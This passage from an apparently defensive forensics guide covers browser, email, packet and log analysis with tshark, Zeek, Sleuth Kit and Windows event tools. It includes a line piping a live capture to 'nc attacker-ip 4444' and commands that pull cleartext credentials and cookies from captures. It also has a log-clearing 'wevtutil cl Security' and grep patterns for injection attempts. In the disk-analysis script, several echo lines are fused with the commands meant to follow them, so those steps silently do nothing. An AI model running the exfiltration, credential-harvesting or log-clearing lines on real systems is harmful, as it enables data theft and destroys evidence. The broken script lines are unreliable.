sqlite3 places.sqlite "SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC"

# Parse bookmarks
sqlite3 places.sqlite "SELECT moz_bookmarks.title, moz_places.url FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk = moz_places.id"

# Extract cookies
icat disk_image.raw <cookies-inode> > cookies.sqlite
sqlite3 cookies.sqlite "SELECT host, name, value, creationTime, expiry FROM moz_cookies"

# Extract downloads
sqlite3 places.sqlite "SELECT url, content, dateAdded FROM moz_annos WHERE content LIKE '%download%'"
```

### Email Forensics

**PST/OST Files (Outlook)**

```bash
# Find PST/OST files
fls -r disk_image.raw | grep -iE "\.pst$|\.ost$"

# Extract file
icat disk_image.raw <inode> > mailbox.pst

# Convert PST to mbox format
apt install pst-utils
readpst -r -o output_dir mailbox.pst

# Parse with Python
pip3 install pypff

python3 << 'EOF'
import pypff

pst = pypff.file()
pst.open("mailbox.pst")

for folder in pst.root_folder.sub_folders:
    print(f"Folder: {folder.name}")
    for message in folder.sub_messages:
        print(f"  From: {message.sender_name}")
        print(f"  Subject: {message.subject}")
        print(f"  Date: {message.delivery_time}")
        print(f"  Body: {message.plain_text_body[:200]}...")
        print("---")

pst.close()
EOF
```

**Thunderbird/MBOX Files**

```bash
# Find MBOX files
fls -r disk_image.raw | grep -i "\.mbox\|Inbox\|Sent"

# Extract
icat disk_image.raw <inode> > mailbox.mbox

# Parse MBOX
python3 << 'EOF'
import mailbox

mbox = mailbox.mbox('mailbox.mbox')
for message in mbox:
    print(f"From: {message['from']}")
    print(f"To: {message['to']}")
    print(f"Subject: {message['subject']}")
    print(f"Date: {message['date']}")
    print(f"Body: {message.get_payload()[:200]}...")
    print("---")
EOF
```

### Comprehensive Disk Analysis Script

```bash
#!/bin/bash

IMAGE="$1"
OUTPUT="disk_analysis_$(date +%Y%m%d_%H%M%S)"

mkdir -p "$OUTPUT"

echo "[*] Disk Image Analysis: $IMAGE"
echo "===================================="

# Basic information
echo "[+] Image Information" | tee "$OUTPUT/info.txt"
file "$IMAGE" | tee -a "$OUTPUT/info.txt"
ls -lh "$IMAGE" | tee -a "$OUTPUT/info.txt"
md5sum "$IMAGE" | tee -a "$OUTPUT/hash.txt"
sha256sum "$IMAGE" | tee -a "$OUTPUT/hash.txt"

# Partition table
echo "[+] Partition Table" | tee "$OUTPUT/partitions.txt"
mmls "$IMAGE" | tee -a "$OUTPUT/partitions.txt"

# File system info
echo "[+] File System Information" | tee "$OUTPUT/fsstat.txt"
fsstat "$IMAGE" | tee -a "$OUTPUT/fsstat.txt"

# File listing
echo "[+] Creating file listing..."
fls -r -p -m / "$IMAGE" > "$OUTPUT/file_listing.txt"

# Timeline
echo "[+] Creating timeline..."
fls -r -m / "$IMAGE" > "$OUTPUT/bodyfile.txt"
mactime -b "$OUTPUT/bodyfile.txt" -d > "$OUTPUT/timeline.csv"

# Search for interesting files
echo "[+] Searching for interesting files..." | tee "$OUTPUT/interesting_files.txt"
grep -iE "password|secret|private|key|config|\.pem|\.ppk|id_rsa" "$OUTPUT/file_listing.txt" | tee -a "$OUTPUT/interesting_files.txt"

# Deleted files
echo "[+] Listing deleted files..." | tee "$OUTPUT/deleted_files.txt"
fls -r -d -p "$IMAGE" | tee -a "$OUTPUT/deleted_files.txt"

# File carving
echo "[+] Carving files..."
foremost -t jpg,png,pdf,doc,zip -i "$IMAGE" -o "$OUTPUT/carved"

# Strings extraction
echo "[+] Extracting strings..." strings -a -n 8 "$IMAGE" > "$OUTPUT/strings.txt" strings -a -el -n 8 "$IMAGE" > "$OUTPUT/strings_unicode.txt"

# Search for credentials in strings
echo "[+] Searching for credentials in strings..." grep -iE "password|passwd|pwd|username|user|login" "$OUTPUT/strings.txt" | head -100 > "$OUTPUT/potential_credentials.txt"

# Search for URLs
echo "[+] Extracting URLs..." grep -oE "https?://[^\s"']+" "$OUTPUT/strings.txt" | sort -u > "$OUTPUT/urls.txt"

# Search for email addresses
echo "[+] Extracting email addresses..." grep -oE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+.[A-Z|a-z]{2,}\b" "$OUTPUT/strings.txt" | sort -u > "$OUTPUT/emails.txt"

# Search for IP addresses
echo "[+] Extracting IP addresses..." grep -oE "\b([0-9]{1,3}.){3}[0-9]{1,3}\b" "$OUTPUT/strings.txt" | sort -u > "$OUTPUT/ips.txt"

echo "[*] Analysis complete. Results in: $OUTPUT"
````

---

## Network Packet Analysis

Network packet analysis examines captured network traffic to identify protocols, extract data, detect malicious activity, and reconstruct network sessions.

### Packet Capture Acquisition

**Live Capture with tcpdump**
```bash
# Basic capture
tcpdump -i eth0 -w capture.pcap

# Capture with snaplen (full packets)
tcpdump -i eth0 -s 65535 -w capture.pcap

# Capture specific host
tcpdump -i eth0 host 192.168.1.10 -w capture.pcap

# Capture specific port
tcpdump -i eth0 port 80 -w capture.pcap

# Capture TCP traffic only
tcpdump -i eth0 tcp -w capture.pcap

# Capture with BPF filter
tcpdump -i eth0 'tcp port 443 and host 192.168.1.10' -w capture.pcap

# Capture and display
tcpdump -i eth0 -n -vv

# Rotate capture files by size
tcpdump -i eth0 -w capture.pcap -C 100  # 100MB per file
````

**Live Capture with Wireshark**

```bash
# Start Wireshark
wireshark

# Command-line capture with dumpcap
dumpcap -i eth0 -w capture.pcap

# Capture with ring buffer (rotate files)
dumpcap -i eth0 -b filesize:100000 -b files:10 -w capture.pcap

# List interfaces
dumpcap -D
tshark -D
```

**Remote Packet Capture**

```bash
# SSH tunnel + tcpdump
ssh user@remote-host "tcpdump -i eth0 -w - 'not port 22'" > remote_capture.pcap

# Using tcpdump with netcat
# On remote host:
tcpdump -i eth0 -w - | nc attacker-ip 4444

# On local machine:
nc -l -p 4444 > capture.pcap
```

### Wireshark Analysis

**Basic Analysis**

```bash
# Open capture file
wireshark capture.pcap

# Command-line analysis with tshark
tshark -r capture.pcap

# Display specific fields
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.port

# Count packets by protocol
tshark -r capture.pcap -q -z io,phs

# Protocol hierarchy statistics
tshark -r capture.pcap -q -z io,phs
```

**Display Filters (Wireshark)**

```bash
# Filter by IP address
ip.addr == 192.168.1.10
ip.src == 192.168.1.10
ip.dst == 192.168.1.10

# Filter by port
tcp.port == 80
udp.port == 53

# Filter by protocol
http
dns
ssh
ftp
smtp

# HTTP specific
http.request.method == "POST"
http.response.code == 200
http.request.uri contains "admin"
http.cookie contains "session"

# DNS queries
dns.qry.name contains "example.com"

# TLS/SSL
tls.handshake.type == 1  # Client Hello

# Filter by TCP flags
tcp.flags.syn == 1
tcp.flags.rst == 1

# Combine filters
ip.src == 192.168.1.10 && tcp.port == 443
http.request.method == "POST" && http.request.uri contains "login"

# Follow TCP stream
tcp.stream eq 0
```

**Export Objects**

```bash
# Export HTTP objects
tshark -r capture.pcap --export-objects http,./http_objects/

# In Wireshark GUI:
# File â†’ Export Objects â†’ HTTP/SMB/DICOM/TFTP

# Export specific object
# Select object â†’ Save As
```

**Statistics and Analysis**

```bash
# Conversations (endpoints)
tshark -r capture.pcap -q -z conv,tcp
tshark -r capture.pcap -q -z conv,udp
tshark -r capture.pcap -q -z conv,ip

# Endpoints
tshark -r capture.pcap -q -z endpoints,ip
tshark -r capture.pcap -q -z endpoints,tcp

# Protocol distribution
tshark -r capture.pcap -q -z io,phs

# HTTP statistics
tshark -r capture.pcap -q -z http,tree
tshark -r capture.pcap -q -z http_req,tree
tshark -r capture.pcap -q -z http_srv,tree

# DNS statistics
tshark -r capture.pcap -q -z dns,tree
```

### Protocol-Specific Analysis

**HTTP/HTTPS Analysis**

```bash
# Extract HTTP requests
tshark -r capture.pcap -Y "http.request" -T fields -e ip.src -e http.request.method -e http.request.uri

# Extract HTTP responses
tshark -r capture.pcap -Y "http.response" -T fields -e ip.src -e http.response.code

# Extract User-Agent strings
tshark -r capture.pcap -Y "http.request" -T fields -e http.user_agent | sort -u

# Extract cookies
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie

# Extract POST data
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data

# Reconstruct HTTP objects
foremost -t all -i capture.pcap -o http_carved/

# TLS/SSL certificate extraction
tshark -r capture.pcap -Y "tls.handshake.certificate" -T fields -e tls.handshake.certificate > certs.txt
```

**DNS Analysis**

```bash
# Extract DNS queries
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name

# Extract DNS responses
tshark -r capture.pcap -Y "dns.flags.response == 1" -T fields -e dns.qry.name -e dns.a

# Find DNS tunneling (long queries)
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | awk '{if(length > 50) print}'

# Count queries per domain
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | sort | uniq -c | sort -rn

# Detect DNS exfiltration patterns
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | grep -E "[0-9a-f]{32,}"
```

**FTP Analysis**

```bash
# Extract FTP commands
tshark -r capture.pcap -Y "ftp.request.command" -T fields -e ftp.request.command -e ftp.request.arg

# Extract FTP responses
tshark -r capture.pcap -Y "ftp.response.code" -T fields -e ftp.response.code -e ftp.response.arg

# Follow FTP-DATA stream
tshark -r capture.pcap -Y "ftp-data"

# Extract transferred files
tshark -r capture.pcap -Y "ftp-data" -T fields -e ftp-data.data
```

**SMTP Analysis**

```bash
# Extract email metadata
tshark -r capture.pcap -Y "smtp" -T fields -e smtp.req.parameter

# Extract email addresses
tshark -r capture.pcap -Y "smtp" | grep -oE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b"

# Extract email body
tshark -r capture.pcap -Y "smtp.data.fragment" -T fields -e smtp.data.fragment

# Reconstruct email
# Follow TCP stream of SMTP session
tshark -r capture.pcap -q -z follow,tcp,ascii,0
```

**SMB/CIFS Analysis**

```bash
# Extract SMB file transfers
tshark -r capture.pcap -Y "smb2" -T fields -e smb2.filename

# Extract SMB commands
tshark -r capture.pcap -Y "smb2.cmd" -T fields -e smb2.cmd

# Extract SMB shares
tshark -r capture.pcap -Y "smb2.tree" -T fields -e smb2.tree

# Export SMB objects
tshark -r capture.pcap --export-objects smb,./smb_objects/
```

**SSH Analysis**

```bash
# Identify SSH connections
tshark -r capture.pcap -Y "ssh"

# Extract SSH version
tshark -r capture.pcap -Y "ssh" -T fields -e ssh.protocol

# Detect SSH bruteforce (multiple connections)
tshark -r capture.pcap -Y "tcp.port == 22" -T fields -e ip.src | sort | uniq -c | sort -rn

# [Inference] SSH payload is encrypted, only metadata visible
```

### Network Flow Analysis

**Extract Network Flows**

```bash
# Using tshark conversations
tshark -r capture.pcap -q -z conv,tcp > tcp_flows.txt
tshark -r capture.pcap -q -z conv,udp > udp_flows.txt

# Generate NetFlow data with softflowd
apt install softflowd
softflowd -r capture.pcap -n 127.0.0.1:9995

# Analyze with nfdump
apt install nfdump
nfcapd -p 9995 -l ./flows
nfdump -R ./flows -o extended
```

**Connection Timeline**

```bash
# Extract connection timestamps
tshark -r capture.pcap -T fields -e frame.time -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e tcp.flags

# Create timeline of connections
python3 << 'EOF'
import sys
from collections import defaultdict

connections = defaultdict(list)

for line in sys.stdin:
    fields = line.strip().split('\t')
    if len(fields) >= 5:
        timestamp, src_ip, dst_ip, src_port, dst_port = fields[:5]
        conn_id = f"{src_ip}:{src_port} -> {dst_ip}:{dst_port}"
        connections[conn_id].append(timestamp)

for conn, times in sorted(connections.items()):
    print(f"{conn}: {len(times)} packets")
    print(f"  First: {times[0]}")
    print(f"  Last: {times[-1]}")
EOF
```

### Advanced Analysis Techniques

**Detect Port Scanning**

```bash
# Detect SYN scan
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" -T fields -e ip.src | sort | uniq -c | sort -rn

# Detect connection to many ports from single source
tshark -r capture.pcap -T fields -e ip.src -e tcp.dstport | awk '{print $1}' | sort | uniq -c | sort -rn

# Detect RST responses (closed ports)
tshark -r capture.pcap -Y "tcp.flags.reset == 1" -T fields -e ip.dst | sort | uniq -c
```

**Detect Data Exfiltration**

```bash
# Large outbound transfers
tshark -r capture.pcap -q -z io,stat,0,"SUM(frame.len)frame.len && ip.src==192.168.1.10"

# Unusual DNS query sizes
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | awk '{if(length > 100) print}'

# ICMP tunneling detection
tshark -r capture.pcap -Y "icmp.type == 8" -T fields -e data.len | awk '{if($1 > 100) count++} END {print count}'

# Detect beaconing (regular intervals)
tshark -r capture.pcap -Y "ip.dst == attacker-ip" -T fields -e frame.time_relative > times.txt
python3 << 'EOF'
times = [float(x) for x in open('times.txt').readlines()]
intervals = [times[i+1] - times[i] for i in range(len(times)-1)]
avg = sum(intervals) / len(intervals)
print(f"Average interval: {avg:.2f}s")
# Regular intervals indicate beaconing
EOF
```

**Malware Traffic Detection**

```bash
# Detect suspicious User-Agents
tshark -r capture.pcap -Y "http.user_agent" -T fields -e http.user_agent | sort -u

# Common suspicious patterns:
# - Missing User-Agent
# - Custom/unusual User-Agents
# - PowerShell User-Agents

# Detect suspicious TLS certificates
tshark -r capture.pcap -Y "tls.handshake.certificate" -T fields -e x509sat.printableString

# Detect connections to known malicious IPs
# Compare extracted IPs against threat intelligence feeds
tshark -r capture.pcap -T fields -e ip.dst | sort -u > ips.txt
# Compare with IOC lists
```

**Credential Extraction**

```bash
# Extract credentials from HTTP POST
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data | grep -iE "user|pass|login"

# Extract FTP credentials
tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" -T fields -e ftp.request.command -e ftp.request.arg

# Extract SMTP credentials
tshark -r capture.pcap -Y "smtp.req.command == AUTH" -T fields -e smtp.req.parameter

# Extract cleartext passwords with ngrep
ngrep -I capture.pcap -q -i "password|pass=" | grep -oP 'password=\K[^&\s]+'
```

### NetworkMiner - PCAP Analysis Tool

**Installation and Usage**

```bash
# Download NetworkMiner (Windows/Linux with Mono)
# Linux with Mono:
apt install mono-complete
wget https://www.netresec.com/?download=NetworkMiner -O NetworkMiner.zip
unzip NetworkMiner.zip
cd NetworkMiner_*
mono NetworkMiner.exe

# Opens GUI - load PCAP file
# Automatically extracts:
# - Hosts
# - Files
# - Images
# - Credentials
# - DNS queries
# - Sessions
```

**Command-Line Alternative: NetworkMinerCLI**

```bash
# Extract files from PCAP
mono NetworkMinerCLI.exe -r capture.pcap -o ./extracted/

# Output includes:
# - AssembledFiles/: Reconstructed files
# - Credentials.txt: Found credentials
# - DNS.txt: DNS queries
```

### Zeek (Bro) Network Analysis

**Installation**

```bash
# Install Zeek
apt install zeek

# Or from source
git clone --recursive https://github.com/zeek/zeek
cd zeek && ./configure && make && make install
```

**Analyze PCAP with Zeek**

```bash
# Process PCAP file
zeek -r capture.pcap

# Generates log files:
ls *.log
# - conn.log: Connection summaries
# - http.log: HTTP requests
# - dns.log: DNS queries
# - ssl.log: SSL/TLS connections
# - files.log: File transfers
# - weird.log: Anomalies

# Analyze specific log
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p proto service

# HTTP analysis
cat http.log | zeek-cut ts id.orig_h method host uri status_code

# DNS analysis
cat dns.log | zeek-cut ts id.orig_h query answers

# Extract files
zeek -r capture.pcap extract-all-files.zeek
# Files saved in extract_files/
```

**Custom Zeek Scripts**

```bash
# Create custom analysis script
cat > analyze.zeek << 'EOF'
event http_request(c: connection, method: string, original_URI: string, 
                   unescaped_URI: string, version: string) {
    if (/password|login|admin/ in original_URI) {
        print fmt("Suspicious URL: %s %s", c$id$orig_h, original_URI);
    }
}

event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count) {
    if (|query| > 50) {
        print fmt("Long DNS query: %s -> %s", c$id$orig_h, query);
    }
}
EOF

# Run custom script
zeek -r capture.pcap analyze.zeek
```

### Packet Analysis Automation Script

```bash
#!/bin/bash

PCAP="$1"
OUTPUT="pcap_analysis_$(date +%Y%m%d_%H%M%S)"

mkdir -p "$OUTPUT"

echo "[*] Analyzing: $PCAP"
echo "===================="

# Basic statistics
echo "[+] Capture Statistics" | tee "$OUTPUT/statistics.txt"
capinfos "$PCAP" | tee -a "$OUTPUT/statistics.txt"

# Protocol hierarchy
echo "[+] Protocol Hierarchy" | tee "$OUTPUT/protocols.txt"
tshark -r "$PCAP" -q -z io,phs | tee -a "$OUTPUT/protocols.txt"

# Endpoints
echo "[+] IP Endpoints" | tee "$OUTPUT/endpoints.txt"
tshark -r "$PCAP" -q -z endpoints,ip | tee -a "$OUTPUT/endpoints.txt"

# Conversations
echo "[+] TCP Conversations" | tee "$OUTPUT/tcp_conversations.txt"
tshark -r "$PCAP" -q -z conv,tcp | tee -a "$OUTPUT/tcp_conversations.txt"

# HTTP analysis
echo "[+] HTTP Requests" | tee "$OUTPUT/http_requests.txt"
tshark -r "$PCAP" -Y "http.request" -T fields -e ip.src -e http.request.method -e http.host -e http.request.uri | tee -a "$OUTPUT/http_requests.txt"

# DNS analysis
echo "[+] DNS Queries" | tee "$OUTPUT/dns_queries.txt"
tshark -r "$PCAP" -Y "dns.qry.name" -T fields -e dns.qry.name | sort -u | tee -a "$OUTPUT/dns_queries.txt"

# Extract IPs
echo "[+] Unique IP Addresses" | tee "$OUTPUT/ip_addresses.txt"
tshark -r "$PCAP" -T fields -e ip.src -e ip.dst | tr '\t' '\n' | sort -u | grep -v "^$" | tee -a "$OUTPUT/ip_addresses.txt"

# Extract URLs
echo "[+] URLs" | tee "$OUTPUT/urls.txt"
tshark -r "$PCAP" -Y "http.request" -T fields -e http.host -e http.request.uri | awk '{print "http://" $1 $2}' | tee -a "$OUTPUT/urls.txt"

# Export HTTP objects
echo "[+] Exporting HTTP Objects..."
tshark -r "$PCAP" --export-objects http,"$OUTPUT/http_objects/" 2>/dev/null

# Suspicious activity detection
echo "[+] Detecting Suspicious Activity..." | tee "$OUTPUT/suspicious.txt"

# Port scans
echo "  - Port Scan Detection:" | tee -a "$OUTPUT/suspicious.txt"
tshark -r "$PCAP" -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" -T fields -e ip.src | sort | uniq -c | sort -rn | head -10 | tee -a "$OUTPUT/suspicious.txt"

# Large DNS queries (potential tunneling)
echo "  - Long DNS Queries:" | tee -a "$OUTPUT/suspicious.txt"
tshark -r "$PCAP" -Y "dns" -T fields -e dns.qry.name | awk '{if(length > 50) print}' | tee -a "$OUTPUT/suspicious.txt"

# Unusual User-Agents
echo "  - Unusual User-Agents:" | tee -a "$OUTPUT/suspicious.txt"
tshark -r "$PCAP" -Y "http.user_agent" -T fields -e http.user_agent | sort -u | grep -vE "Mozilla|Chrome|Safari|Edge" | tee -a "$OUTPUT/suspicious.txt"

echo "[*] Analysis complete. Results in: $OUTPUT"
```

---

## Log File Forensics

Log file forensics analyzes system, application, and security logs to reconstruct events, detect intrusions, identify anomalies, and establish timelines.

### Linux Log Analysis

**Common Log Locations**

```bash
# System logs
/var/log/syslog          # Debian/Ubuntu system log
/var/log/messages        # RHEL/CentOS system log
/var/log/kern.log        # Kernel messages
/var/log/dmesg           # Boot messages

# Authentication
/var/log/auth.log        # Debian/Ubuntu authentication
/var/log/secure          # RHEL/CentOS authentication
/var/log/faillog         # Failed login attempts
/var/log/lastlog         # Last login information

# Application logs
/var/log/apache2/        # Apache web server
/var/log/nginx/          # Nginx web server
/var/log/mysql/          # MySQL database
/var/log/postgresql/     # PostgreSQL database

# Audit logs
/var/log/audit/audit.log # Audit daemon

# Other
/var/log/cron            # Cron jobs
/var/log/mail.log        # Mail server
/var/log/daemon.log      # Daemon processes
```

**Authentication Log Analysis**

```bash
# View auth log
cat /var/log/auth.log

# Successful logins
grep "Accepted" /var/log/auth.log

# Failed login attempts
grep "Failed password" /var/log/auth.log

# Count failed attempts by user
grep "Failed password" /var/log/auth.log | awk '{print $(NF-5)}' | sort | uniq -c | sort -rn

# Count failed attempts by IP
grep "Failed password" /var/log/auth.log | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort | uniq -c | sort -rn

# SSH sessions
grep "sshd" /var/log/auth.log | grep "session opened"

# Sudo usage
grep "sudo" /var/log/auth.log

# User additions/modifications
grep -E "useradd|usermod|userdel" /var/log/auth.log

# Group modifications
grep -E "groupadd|groupmod|groupdel" /var/log/auth.log
```

**System Log Analysis**

```bash
# View system log
cat /var/log/syslog

# Filter by service
grep "cron" /var/log/syslog
grep "kernel" /var/log/syslog

# Recent system errors
grep -i "error" /var/log/syslog | tail -50

# System warnings
grep -i "warning" /var/log/syslog

# Critical messages
grep -i "critical\|fatal\|panic" /var/log/syslog

# Service starts/stops
grep -E "start|stop|restart" /var/log/syslog

# Hardware events
grep -i "hardware\|disk\|memory" /var/log/syslog
```

**Web Server Log Analysis**

```bash
# Apache access log format:
# IP - - [timestamp] "METHOD /path HTTP/version" status size "referer" "user-agent"

# View access log
cat /var/log/apache2/access.log

# Count requests by IP
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn

# Count requests by URL
awk '{print $7}' /var/log/apache2/access.log | sort | uniq -c | sort -rn

# Find 404 errors
awk '$9 == 404' /var/log/apache2/access.log

# Find 500 errors
awk '$9 >= 500' /var/log/apache2/access.log

# Detect SQL injection attempts
grep -iE "union|select|insert|update|delete|drop|exec" /var/log/apache2/access.log

# Detect XSS attempts
grep -iE "<script|javascript:|onerror|onload" /var/log/apache2/access.log

# Detect path traversal
grep -E "\.\./|\.\.%2F" /var/log/apache2/access.log

# Find POST requests
grep "POST" /var/log/apache2/access.log

# User-Agent analysis
awk -F'"' '{print $6}' /var/log/apache2/access.log | sort | uniq -c | sort -rn

# Bandwidth usage by IP
awk '{sum[$1]+=$10} END {for (ip in sum) print ip, sum[ip]}' /var/log/apache2/access.log | sort -k2 -rn

# Requests per hour
awk '{print $4}' /var/log/apache2/access.log | cut -d: -f2 | sort | uniq -c
```

**Audit Log Analysis (auditd)**

```bash
# View audit log
cat /var/log/audit/audit.log

# Search by syscall
ausearch -sc execve  # Program executions
ausearch -sc open    # File opens
ausearch -sc connect # Network connections

# Search by user
ausearch -ui 1000  # UID 1000

# Search by file
ausearch -f /etc/passwd

# Search by time range
ausearch -ts 09:00:00 -te 17:00:00

# Generate audit report
aureport

# Failed login attempts
aureport -au --failed

# Executable file access
aureport -x

# File access report
aureport -f

# Convert to human-readable
ausearch -i
```

### Windows Log Analysis

**Windows Event Log Locations**

```powershell
# Security events
C:\Windows\System32\winevt\Logs\Security.evtx

# System events
C:\Windows\System32\winevt\Logs\System.evtx

# Application events
C:\Windows\System32\winevt\Logs\Application.evtx

# PowerShell logs
C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx

# Windows Defender
C:\Windows\System32\winevt\Logs\Microsoft-Windows-Windows Defender%4Operational.evtx

# Sysmon (if installed)
C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx
```

**PowerShell Event Log Analysis**

```powershell
# View Security log
Get-EventLog -LogName Security -Newest 100

# View System log
Get-EventLog -LogName System -Newest 100

# Filter by Event ID
Get-EventLog -LogName Security -InstanceId 4624  # Successful logon
Get-EventLog -LogName Security -InstanceId 4625  # Failed logon
Get-EventLog -LogName Security -InstanceId 4672  # Admin logon
Get-EventLog -LogName Security -InstanceId 4688  # Process creation

# Filter by time
$StartTime = (Get-Date).AddDays(-1)
Get-EventLog -LogName Security -After $StartTime

# Filter by source
Get-EventLog -LogName System -Source "Service Control Manager"

# Export to CSV
Get-EventLog -LogName Security | Export-Csv security.csv

# Search for specific text
Get-EventLog -LogName Security | Where-Object {$_.Message -like "*administrator*"}

# Count events by ID
Get-EventLog -LogName Security | Group-Object -Property EventID | Sort-Object Count -Descending
```

**Using wevtutil (Command-Line)**

```cmd
# List available logs
wevtutil el

# Get log information
wevtutil gli Security

# Query log
wevtutil qe Security /c:10 /rd:true /f:text

# Export log
wevtutil epl Security C:\exported_security.evtx

# Clear log (destructive!)
wevtutil cl Security
```

**EvtxECmd - EVTX Parser**

```bash
# Install (Windows or Linux with .NET)
wget https://f001.backblazeb2.com/file/EricZimmermanTools/EvtxECmd.zip
unzip EvtxECmd.zip

# Parse single EVTX file
./EvtxECmd.exe -f Security.evtx --csv output_dir

# Parse directory of EVTX files
./EvtxECmd.exe -d C:\Windows\System32\winevt\Logs\ --csv output_dir

# Output to JSON
./EvtxECmd.exe -f Security.evtx --json output_dir
```

**Key Windows Event IDs**

```bash
# Security Event IDs:
# 4624: Successful logon
# 4625: Failed logon
# 4634: Logoff
# 4648: Logon using explicit credentials (RunAs)
# 4672: Special privileges assigned (Admin logon)
# 4688: Process creation
# 4689: Process termination
# 4698: Scheduled task created
# 4699: Scheduled task deleted
# 4702: Scheduled task updated
# 4720: User account created
# 4722: User account enabled
# 4724: Password reset attempt
# 4728: User added to security-enabled global group
# 4732: User added to security-enabled local group
# 4756: User added to security-enabled universal group

# System Event IDs:
# 1074: System shutdown/restart
# 6005: Event log service started (boot)
# 6006: Event log service stopped (shutdown)
# 6008: Unexpected shutdown
# 7034: Service crashed
# 7035: Service start/stop
# 7036: Service state change
# 7040: Service start type changed

# PowerShell Event IDs:
# 4103: Module logging
# 4104: Script block logging
# 4105: Script start
# 4106: Script stop

# Sysmon Event IDs:
# 1: Process creation
# 2: File creation time changed
# 3: Network connection
# 5: Process terminated
# 7: Image/DLL loaded
# 8: CreateRemoteThread
# 10: Process accessed
# 11: File created
# 12/13/14: Registry events
# 15: FileCreateStream
# 17: Pipe created
# 18: Pipe connected
# 19: WMI event
# 20: WMI consumer
# 21: WMI filter
# 22: DNS query
# 23: File delete
````

### Log Correlation and Timeline Analysis

**Creating Timeline from Multiple Log Sources**
```bash
#!/bin/bash

OUTPUT="timeline_$(date +%Y%m%d_%H%M%S).csv"

echo "Timestamp,Source,Event,Details" > "$OUTPUT"

# Parse auth.log
awk '/Failed password/ {print $1" "$2" "$3",auth.log,Failed Login,"$0}' /var/log/auth.log >> "$OUTPUT"
awk '/Accepted/ {print $1" "$2" "$3",auth.log,Successful Login,"$0}' /var/log/auth.log >> "$OUTPUT"

# Parse Apache access.log
awk '{gsub(/\[|\]/,"",$4); print $4",apache,HTTP Request,"$0}' /var/log/apache2/access.log >> "$OUTPUT"

# Parse syslog
awk '/error|warning|critical/ {print $1" "$2" "$3",syslog,System Event,"$0}' /var/log/syslog >> "$OUTPUT"

# Sort by timestamp
sort -t',' -k1 "$OUTPUT" -o "$OUTPUT"

echo "[+] Timeline created: $OUTPUT"
````

**Log2timeline (Plaso) - Comprehensive Timeline**

```bash
# Install
apt install plaso-tools

# Create timeline from disk image
log2timeline.py --storage-file timeline.plaso disk_image.raw

# Process specific artifacts
log2timeline.py --parsers linux,apache,ssh timeline.plaso /var/log/

# Generate human-readable output
psort.py -o l2tcsv -w timeline.csv timeline.plaso

# Filter by time range
psort.py -o l2tcsv --date_filters "2024-01-01..2024-12-31" -w timeline.csv timeline.plaso

# Filter by specific parser
psort.py -o l2tcsv --parsers syslog -w syslog_timeline.csv timeline.plaso
```

**Manual Timeline Correlation**

```python
#!/usr/bin/env python3
import re
from datetime import datetime
from collections import defaultdict

def parse_auth_log(filename):
    events = []
    with open(filename, 'r') as f:
        for line in f:
            # Example: Jan 15 10:30:45 hostname sshd[1234]: Failed password
            match = re.search(r'(\w+ \d+ \d+:\d+:\d+).*(Failed password|Accepted).*from (\d+\.\d+\.\d+\.\d+)', line)
            if match:
                timestamp = match.group(1)
                event_type = match.group(2)
                ip = match.group(3)
                events.append({
                    'timestamp': timestamp,
                    'source': 'auth.log',
                    'type': event_type,
                    'ip': ip,
                    'raw': line.strip()
                })
    return events

def parse_apache_log(filename):
    events = []
    with open(filename, 'r') as f:
        for line in f:
            # Example: 192.168.1.1 - - [15/Jan/2024:10:30:45 +0000] "GET /path HTTP/1.1" 200 1234
            match = re.search(r'(\d+\.\d+\.\d+\.\d+).*\[([^\]]+)\] "(\w+) ([^"]+)" (\d+)', line)
            if match:
                ip = match.group(1)
                timestamp = match.group(2)
                method = match.group(3)
                path = match.group(4)
                status = match.group(5)
                events.append({
                    'timestamp': timestamp,
                    'source': 'apache',
                    'type': f'{method} {status}',
                    'ip': ip,
                    'path': path,
                    'raw': line.strip()
                })
    return events

def correlate_by_ip(events):
    by_ip = defaultdict(list)
    for event in events:
        by_ip[event.get('ip', 'unknown')].append(event)
    
    print("[+] Events by IP Address:")
    for ip, ip_events in sorted(by_ip.items(), key=lambda x: len(x[1]), reverse=True):
        print(f"\n{ip}: {len(ip_events)} events")
        for evt in ip_events[:5]:  # Show first 5
            print(f"  {evt['timestamp']} - {evt['source']}: {evt['type']}")

# Usage
auth_events = parse_auth_log('/var/log/auth.log')
apache_events = parse_apache_log('/var/log/apache2/access.log')
all_events = auth_events + apache_events

correlate_by_ip(all_events)
```

### Advanced Log Analysis Tools

**Graylog - Centralized Logging**

```bash
# Install Graylog (requires Elasticsearch and MongoDB)
# Follow: https://go2docs.graylog.org/current/downloading_and_installing_graylog/

# Send logs to Graylog
# Using syslog:
echo "*.* @graylog-server:514" >> /etc/rsyslog.conf
systemctl restart rsyslog

# Using GELF:
apt install graylog-sidecar
graylog-sidecar -service install
```

**ELK Stack (Elasticsearch, Logstash, Kibana)**

```bash
# Install Elasticsearch
wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | apt-key add -
echo "deb https://artifacts.elastic.co/packages/8.x/apt stable main" | tee /etc/apt/sources.list.d/elastic-8.x.list
apt update && apt install elasticsearch

# Install Logstash
apt install logstash

# Install Kibana
apt install kibana

# Configure Logstash pipeline
